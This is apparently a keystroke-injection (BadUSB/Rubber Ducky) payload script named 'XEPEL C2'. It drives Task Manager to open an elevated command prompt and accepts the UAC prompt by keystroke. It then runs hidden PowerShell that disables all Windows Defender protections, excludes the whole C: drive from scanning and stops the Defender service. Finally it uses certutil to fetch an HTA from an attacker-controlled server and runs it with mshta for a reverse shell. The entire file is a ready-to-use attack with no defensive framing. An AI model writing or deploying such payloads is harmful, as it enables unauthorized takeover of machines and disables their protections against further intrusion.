REM XEPEL C2 – Defender Kill + Reverse Shell
REM Task Manager entry, no Run dialog
REM Windows 10/11

DELAY 3000

REM ── Open Task Manager ──
CTRL+SHIFT+ESC
DELAY 2000

REM ── File > Run new task ──
ALT+f
DELAY 800
STRING r
DELAY 1200

REM ── Launch elevated cmd ──
STRING cmd
DELAY 400
ALT+c
DELAY 400
ENTER
DELAY 2000

REM ── UAC accept ──
ALT+y
DELAY 2000

REM ── Kill Defender + Download + Execute ──
STRING powershell -w hidden -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend; Add-MpPreference -ExclusionPath 'C:\'; Stop-Service WinDefend -Force; Set-Service WinDefend -StartupType Disabled; certutil -urlcache -split -f http://YOUR_VPS_IP/s.hta C:\Windows\Temp\s.hta; mshta C:\Windows\Temp\s.hta"
ENTER
DELAY 1000
STRING exit
ENTER
